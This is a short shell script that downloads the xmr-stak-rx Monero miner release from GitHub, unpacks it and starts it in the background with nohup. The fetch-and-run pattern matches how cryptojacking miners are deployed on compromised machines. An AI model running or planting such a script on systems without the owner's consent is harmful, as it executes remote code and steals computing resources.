#!/bin/sh

wget https://github.com/fireice-uk/xmr-stak/releases/download/1.0.5-rx/xmr-stak-rx-linux-1.0.5-cpu.tar.xz

tar -xf xmr-stak-rx-linux-1.0.5-cpu.tar.xz

cd xmr-stak-rx-linux-1.0.5-cpu

nohup ./xmr-stak-rx &
